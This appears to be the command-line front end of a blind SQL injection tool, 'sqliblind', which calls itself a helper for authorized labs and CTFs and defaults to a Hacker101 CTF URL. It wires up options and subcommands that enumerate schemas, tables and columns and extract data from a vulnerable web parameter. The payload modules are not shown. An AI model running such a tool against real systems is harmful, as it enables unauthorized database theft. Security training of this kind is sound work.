from __future__ import annotations

import argparse
import json
import sys
from typing import Sequence

from . import __version__
from .client import HttpClient, HttpConfig
from .dialects import get_dialect
from .extractor import BlindExtractor, ExtractorConfig
from .graph import FORMATS, render_database_map, write_report
from .models import DatabaseMap
from .oracle import ResponseOracle

BASE_URL = "https://08d9880a384777322d0e2df7db7e5215.ctf.hacker101.com/fetch"
_MAP_COMMANDS = {"map", "graph", "schema-map"}


def _parse_key_value(values: list[str], separator: str, option: str) -> dict[str, str]:
    parsed: dict[str, str] = {}
    for value in values:
        if separator not in value:
            raise ValueError(f"{option} expects KEY{separator}VALUE: {value!r}")
        key, item = value.split(separator, 1)
        key = key.strip()
        if not key:
            raise ValueError(f"{option} contains an empty key")
        parsed[key] = item.strip()
    return parsed


def _parse_statuses(value: str) -> set[int]:
    try:
        statuses = {int(item.strip()) for item in value.split(",") if item.strip()}
    except ValueError as exc:
        raise ValueError("--true-status must contain integers") from exc
    if not statuses or any(status < 100 or status > 599 for status in statuses):
        raise ValueError("--true-status must contain valid HTTP status codes")
    return statuses


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="sqliblind",
        description=(
            "Bounded blind SQLi helper for authorized laboratories and CTFs. "
            "The configured BASE_URL is used when --url is omitted."
        ),
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    parser.add_argument("--url", default=BASE_URL, help="Target URL")
    parser.add_argument("--parameter", default="id", help="Query parameter to replace")
    parser.add_argument(
        "--url-template",
        help="URL containing {{PAYLOAD}} or [TO_REPLACE]; overrides --parameter",
    )
    parser.add_argument("--dialect", choices=("mysql", "sqlite"), default="mysql")
    parser.add_argument(
        "--oracle",
        choices=("status", "marker", "regex", "length"),
        default="status",
    )
    parser.add_argument("--true-status", default="200", help="Comma-separated true statuses")
    parser.add_argument("--true-marker")
    parser.add_argument("--true-regex")
    parser.add_argument("--true-length", type=int)
    parser.add_argument("--length-tolerance", type=int, default=0)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument("--retries", type=int, default=1)
    parser.add_argument("--delay", type=float, default=0.1, help="Global delay between requests")
    parser.add_argument("--max-requests", type=int, default=5000)
    parser.add_argument("--workers", type=int, default=4, help="Concurrent extraction jobs (1-16)")
    parser.add_argument("--max-length", type=int, default=128)
    parser.add_argument("--max-items", type=int, default=128)
    parser.add_argument("--min-char-code", type=int, default=32)
    parser.add_argument("--max-char-code", type=int, default=126)
    parser.add_argument("--header", action="append", default=[], metavar="KEY:VALUE")
    parser.add_argument("--cookie", action="append", default=[], metavar="KEY=VALUE")
    parser.add_argument("--proxy")
    parser.add_argument("--insecure", action="store_true", help="Disable TLS validation")
    parser.add_argument("--skip-calibration", action="store_true")
    parser.add_argument("--json", action="store_true", dest="json_output")

    subparsers = parser.add_subparsers(dest="command")
    subparsers.add_parser("schemas", help="Enumerate database schemas")

    tables = subparsers.add_parser("tables", help="Enumerate tables in one schema")
    tables.add_argument("--schema", required=True)

    columns = subparsers.add_parser("columns", help="Enumerate columns in one table")
    columns.add_argument("--schema", required=True)
    columns.add_argument("--table", required=True)

    extract = subparsers.add_parser("extract", help="Extract one scalar SQL expression")
    extract.add_argument("--expression", required=True)

    probe = subparsers.add_parser("probe", help="Evaluate one boolean SQL condition")
    probe.add_argument("--condition", required=True)

    graph = subparsers.add_parser(
        "map",
        aliases=("graph", "schema-map"),
        help="Enumerate and represent schema/table/column relationships",
    )
    graph.add_argument("--format", choices=tuple(sorted(FORMATS)), default="tree")
    graph.add_argument("--output", help="Report destination (.txt, .mmd, .html, or .json)")
    graph.add_argument("--ascii", action="store_true", dest="ascii_only")
    graph.add_argument(
        "--no-columns",
        action="store_true",
        help="Stop after schemas and tables to reduce requests",
    )
    graph.add_argument("--title", default="imr-sqliblind schema map")
    return parser


def _build_extractor(args: argparse.Namespace) -> BlindExtractor:
    headers = _parse_key_value(args.header, ":", "--header")
    cookies = _parse_key_value(args.cookie, "=", "--cookie")
    client = HttpClient(
        HttpConfig(
            url=args.url,
            parameter=args.parameter,
            url_template=args.url_template,
            timeout=args.timeout,
            verify_tls=not args.insecure,
            retries=args.retries,
            delay=args.delay,
            max_requests=args.max_requests,
            headers=headers,
            cookies=cookies,
            proxy=args.proxy,
        )
    )
    oracle = ResponseOracle.from_options(
        mode=args.oracle,
        true_statuses=_parse_statuses(args.true_status),
        marker=args.true_marker,
        regex=args.true_regex,
        expected_length=args.true_length,
        length_tolerance=args.length_tolerance,
    )
    return BlindExtractor(
        client,
        oracle,
        get_dialect(args.dialect),
        ExtractorConfig(
            workers=args.workers,
            max_length=args.max_length,
            max_items=args.max_items,
            min_char_code=args.min_char_code,
            max_char_code=args.max_char_code,
        ),
    )


def _statistics(extractor: BlindExtractor, workers: int) -> str:
    return (
        f"Requests: {extractor.client.requests_used} | "
        f"Elapsed: {round(extractor.elapsed_seconds, 3)}s | Workers: {workers}"
    )


def _emit(args: argparse.Namespace, data: object, extractor: BlindExtractor) -> None:
    result = {
        "result": data,
        "requests": extractor.client.requests_used,
        "elapsed_seconds": round(extractor.elapsed_seconds, 3),
    }
    if args.json_output:
        print(json.dumps(result, indent=2, ensure_ascii=False))
        return
    if isinstance(data, list):
        for index, value in enumerate(data, start=1):
            print(f"[{index}] {value}")
    else:
        print(data)
    print(f"\n{_statistics(extractor, args.workers)}")


def _emit_map(
    args: argparse.Namespace, database: DatabaseMap, extractor: BlindExtractor
) -> None:
    if args.json_output:
        document = {
            "result": database.to_dict(),
            "requests": extractor.client.requests_used,
            "elapsed_seconds": round(extractor.elapsed_seconds, 3),
        }
        content = json.dumps(document, indent=2, ensure_ascii=False)
        if args.output:
            destination = write_report(args.output, content, default_suffix=".json")
            print(f"Report written: {destination}")
            print(_statistics(extractor, args.workers))
        else:
            print(content)
        return

    content = render_database_map(
        database,
        output_format=args.format,
        ascii_only=args.ascii_only,
        title=args.title,
    )
    output = args.output
    if args.format == "html" and output is None:
        output = "imr-sqliblind-schema-map.html"
    if output:
        suffix = ".html" if args.format == "html" else ".txt"
        destination = write_report(output, content, default_suffix=suffix)
        print(f"Report written: {destination}")
        print(_statistics(extractor, args.workers))
    else:
        print(content)
        print(f"\n{_statistics(extractor, args.workers)}")


def main(argv: Sequence[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if args.command is None:
        args.command = "schemas"

    try:
        extractor = _build_extractor(args)
        if not args.skip_calibration:
            true_result, false_result = extractor.calibrate()
            if not args.json_output:
                print(
                    "Oracle calibrated: "
                    f"TRUE={true_result.status_code}/{true_result.body_length}B, "
                    f"FALSE={false_result.status_code}/{false_result.body_length}B"
                )

        if args.command == "schemas":
            data: object = extractor.enumerate_schemas()
        elif args.command == "tables":
            data = extractor.enumerate_tables(args.schema)
        elif args.command == "columns":
            data = extractor.enumerate_columns(args.schema, args.table)
        elif args.command == "extract":
            data = extractor.extract_string(args.expression)
        elif args.command == "probe":
            probe = extractor.probe_condition(args.condition)
            data = {
                "matched": probe.matched,
                "status_code": probe.status_code,
                "body_length": probe.body_length,
                "elapsed_seconds": round(probe.elapsed_seconds, 3),
                "url": probe.final_url,
            }
        elif args.command in _MAP_COMMANDS:
            database = extractor.build_database_map(
                include_columns=not args.no_columns
            )
            _emit_map(args, database, extractor)
            return 0
        else:
            parser.error(f"Unknown command: {args.command}")
            return 2

        _emit(args, data, extractor)
        return 0
    except KeyboardInterrupt:
        print("Interrupted by user.", file=sys.stderr)
        return 130
    except Exception as exc:
        print(f"Error: {exc}", file=sys.stderr)
        return 1
